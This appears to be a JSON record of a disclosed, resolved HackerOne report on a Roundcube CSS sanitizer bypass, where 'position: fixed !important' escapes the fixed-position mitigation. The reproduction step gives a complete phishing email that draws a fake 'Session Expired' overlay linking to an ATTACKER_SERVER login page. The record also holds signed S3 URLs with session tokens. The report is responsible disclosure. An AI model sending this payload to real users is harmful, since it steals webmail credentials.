@@ -1,0 +1,216 @@
+{
+  "id": 3590586,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTkwNTg2",
+  "url": "https://hackerone.com/reports/3590586",
+  "title": "position: fixed !important bypasses CSS sanitizer's fixed-position mitigation, enabling full-viewport phishing overlays.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-07T11:44:24.474Z",
+  "submitted_at": "2026-03-07T11:44:25.435Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nullcathedral",
+    "url": "/nullcathedral",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0msiosnihxn702obxntp2gl96eid/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-04-20T12:04:03.688Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-21T12:03:59.526Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When sanitizing CSS, Roundcube's `sanitize_css_block()` in [rcube_utils.php](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_utils.php) converts `position: fixed` to `position: absolute` to prevent overlay attacks ([L555-557](https://github.com/roundcube/roundcubemail/blob/4e95ebe12/program/lib/Roundcube/rcube_utils.php#L555-L557)).\n\nHowever, the check uses `strcasecmp($value, 'fixed') === 0`, which requires the **entire** trimmed value to be exactly `\"fixed\"`. The value `\"fixed !important\"` fails this comparison. The value then flows through the generic token-based validation path, where `explode_css_property_block()` splits it into tokens `['fixed', '!important']` that both individually pass the allowlist, reassembling as `position: fixed !important` in the output.\n\n## Steps To Reproduce\n\nStep 1: Send an HTML email with the following body:\n\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Account Update</title></head>\n<body>\n<p>Please see below for your account details.</p>\n\n<style>\n.overlay {\n    position: fixed !important;\n    top: 0; left: 0;\n    width: 100%; height: 100%;\n    background: white;\n    z-index: 99999;\n    display: flex;\n    align-items: center;\n    justify-content: center;\n}\n.dialog {\n    border: 1px solid #ccc;\n    border-radius: 8px;\n    padding: 30px;\n    max-width: 400px;\n    text-align: center;\n    font-family: Arial, sans-serif;\n}\n</style>\n\n<div class=\"overlay\">\n  <div class=\"dialog\">\n    <h2>Session Expired</h2>\n    <p>Your Roundcube session has expired due to inactivity.</p>\n    <p><a href=\"https://ATTACKER_SERVER/phish/login\" style=\"background:#0066cc;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;\">Sign In Again</a></p>\n  </div>\n</div>\n\n</body>\n</html>\n```\n\nStep 2: Open the email in Roundcube.\n\nStep 3: Observe the phishing overlay covering:\n- The **preview pane** (iframe) in normal view\n- The **full browser viewport** when the message is opened in a new window (no iframe)\n\n{F5484824}\n{F5484826}\n\n## Impact\n\nCSS injection, phishing",
+  "weakness": {
+    "id": 72,
+    "name": "Resource Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5484824,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/elvkfcrz83aiwsmm95ux0xg4uhxt?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSU72DAKH%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041946Z&X-Amz-Expires=300&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCICOKr9h9PsZrm1rc%2BMOFh32p%2B6G6JbKuRirsJJuduOUDAiEAtOnR3NxESBm79QN0R8cUYJn5ZToahC76WmyKAHtUPR0qugUI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCPypUOKKT6RwqJ6ziqOBdAOSwtosi6xyrHfhr4G5tCMdO6he2m2WjxP8i4h1hnaNvRTWa6KFeYAIwtY2ePNiBdil%2Fy%2BpSAr56VBLZpU8A9IpC2XFRdBmrXauUM7zJ7XfoIwI67GFgMeytsyY3Oii8ujvTjTbSEcRrMYGVWGoywuMlgit%2B7wXtQ%2B9MwabGRVgfkManzJ6u9MQXDb6kCAahvPAP7b11v6awfPfPONXjaQOP8BMZvNS6w%2FHGjoZL46pAvC%2F9P73xn9WVEQKu1moPYG0R6AKBnt7m1gfTsMDkVKCtQx2W8kUNeyOFjj9YT%2BxP%2FSoZdzsLepV3AAjSP6tTtUrqoMaWAWBuMXNf7004ILEBQ%2BYGOI3uU7T09%2FXjAgl%2FIeguS36NwiLepjV9%2BSVFe5ba6BQ9JqewIkUi6TsfIQH%2F4mXtj9UKeksSPn8MnWksSPR59%2BwzTnKkNNY0YF2fPSpBAA%2F%2BBetma4xr%2F0OE9XJ40rfChcla5aInat8P5sGEgRiRfsKu%2BpTIwcJXSJZoUYtSX%2BtmwR%2B6n0QRf3bpz37dlzIycBKx8E5BCKbdV7LIEa0UU56mQs4NzIcuOSb0neDd%2Fdd7DhDU2Cwh2blwEtkGCGSUDmDFH3isFAmm3uAsJA2dy14AZrt3GSQExL4csqQ5%2FaSw7G8RLl0clz7uC0%2B1%2BelPkZhFHRkCX6Ferc02npSALE56%2F1wc8k9DNoWZ27JihOMWID35aYLaUNvkKVZ4pDfqSRNk1OKC9QGXkFo60te35JM9FDNCyumdclk0BSKQsnmICCWtNAlHr%2BhvuQM2ZYHOpp6ox5K38Mg3Rh5fBv8TiezWvq%2BHNtcihg0WMraBXd6hy4bZWhrwsGscQH%2Bql%2FGFa3mLcPeLHfUDDQw5vSBjqxAeH%2Bp%2FApZ4D%2F7fWpeolayEsDg92r6ZkdGgJpK2x%2Boho4tLkfU0kF6TU4qDYwrTxP4N0yAAtZJ2C%2FvqrDQEQyHjl3Jy2fAVaXShsUa6OuKys8QyjKYKLFlnpt06YrZtgYuXe%2FunY0fTkuJ%2FINKpeMHCWiwvImkIykMWkW0%2B%2BTeu1RDMrmUsQxHcMxxlFNaMPjhLFAyNDAuemq0f8WxFR0rUeN%2FER9RdiFVEoDmZFKxgVFug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6db07f27cb4f5129aa78a5cda115521debb817657e01b53022f03d02f50a782",
+      "file_size": 82520,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5484826,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zdr1gj5k95f6ajmdtqmovqgmr45r?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSU72DAKH%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T041946Z&X-Amz-Expires=300&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCICOKr9h9PsZrm1rc%2BMOFh32p%2B6G6JbKuRirsJJuduOUDAiEAtOnR3NxESBm79QN0R8cUYJn5ZToahC76WmyKAHtUPR0qugUI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCPypUOKKT6RwqJ6ziqOBdAOSwtosi6xyrHfhr4G5tCMdO6he2m2WjxP8i4h1hnaNvRTWa6KFeYAIwtY2ePNiBdil%2Fy%2BpSAr56VBLZpU8A9IpC2XFRdBmrXauUM7zJ7XfoIwI67GFgMeytsyY3Oii8ujvTjTbSEcRrMYGVWGoywuMlgit%2B7wXtQ%2B9MwabGRVgfkManzJ6u9MQXDb6kCAahvPAP7b11v6awfPfPONXjaQOP8BMZvNS6w%2FHGjoZL46pAvC%2F9P73xn9WVEQKu1moPYG0R6AKBnt7m1gfTsMDkVKCtQx2W8kUNeyOFjj9YT%2BxP%2FSoZdzsLepV3AAjSP6tTtUrqoMaWAWBuMXNf7004ILEBQ%2BYGOI3uU7T09%2FXjAgl%2FIeguS36NwiLepjV9%2BSVFe5ba6BQ9JqewIkUi6TsfIQH%2F4mXtj9UKeksSPn8MnWksSPR59%2BwzTnKkNNY0YF2fPSpBAA%2F%2BBetma4xr%2F0OE9XJ40rfChcla5aInat8P5sGEgRiRfsKu%2BpTIwcJXSJZoUYtSX%2BtmwR%2B6n0QRf3bpz37dlzIycBKx8E5BCKbdV7LIEa0UU56mQs4NzIcuOSb0neDd%2Fdd7DhDU2Cwh2blwEtkGCGSUDmDFH3isFAmm3uAsJA2dy14AZrt3GSQExL4csqQ5%2FaSw7G8RLl0clz7uC0%2B1%2BelPkZhFHRkCX6Ferc02npSALE56%2F1wc8k9DNoWZ27JihOMWID35aYLaUNvkKVZ4pDfqSRNk1OKC9QGXkFo60te35JM9FDNCyumdclk0BSKQsnmICCWtNAlHr%2BhvuQM2ZYHOpp6ox5K38Mg3Rh5fBv8TiezWvq%2BHNtcihg0WMraBXd6hy4bZWhrwsGscQH%2Bql%2FGFa3mLcPeLHfUDDQw5vSBjqxAeH%2Bp%2FApZ4D%2F7fWpeolayEsDg92r6ZkdGgJpK2x%2Boho4tLkfU0kF6TU4qDYwrTxP4N0yAAtZJ2C%2FvqrDQEQyHjl3Jy2fAVaXShsUa6OuKys8QyjKYKLFlnpt06YrZtgYuXe%2FunY0fTkuJ%2FINKpeMHCWiwvImkIykMWkW0%2B%2BTeu1RDMrmUsQxHcMxxlFNaMPjhLFAyNDAuemq0f8WxFR0rUeN%2FER9RdiFVEoDmZFKxgVFug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2470c158c6844466a52fd07b7f75daa15c96afa0c0d4f8d5b201b3bac62ac91",
+      "file_size": 140671,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-04-20T12:03:59.973Z",
+  "allow_singular_disclosure_after": -6365746.132505767,
+  "singular_disclosure_allowed": true,
+  "vote_count": 44,
+  "voters": [
+    "bl4de",
+    "mohaned0101",
+    "2026",
+    "johancarloss",
+    "vishnumadhavan",
+    "nwicks",
+    "seanknightja",
+    "akai_5335",
+    "victor10",
+    "lucius-log",
+    "and 34 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 565457,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/roundcube/roundcubemail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3590586",
+  "votes": 44,
+  "latest_disclosable_activity_at": "2026-04-20T12:04:04.063Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:19:46.218987",
+    "source": "https://hackerone.com/reports/3590586.json",
+    "report_id": 3590586
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTkwNTg2",
+    "databaseId": "3590586",
+    "title": "position: fixed !important bypasses CSS sanitizer's fixed-position mitigation, enabling full-viewport phishing overlays.",
+    "url": "https://hackerone.com/reports/3590586",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2026-04-20T12:04:03.688Z",
+    "created_at": "2026-03-07T11:44:24.474Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcy",
+      "name": "Resource Injection",
+      "external_id": "cwe-99"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 5.4
+    },
+    "reporter": {
+      "username": "nullcathedral"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM1OTA1ODY=",
+    "_id": "3590586",
+    "disclosed": true,
+    "votes": 44,
+    "latest_disclosable_activity_at": "2026-04-20T12:04:04.063Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTkwNTg2",
+      "databaseId": "3590586",
+      "title": "position: fixed !important bypasses CSS sanitizer's fixed-position mitigation, enabling full-viewport phishing overlays.",
+      "url": "https://hackerone.com/reports/3590586",
+      "disclosed_at": "2026-04-20T12:04:03.688Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    }
+  }
+}
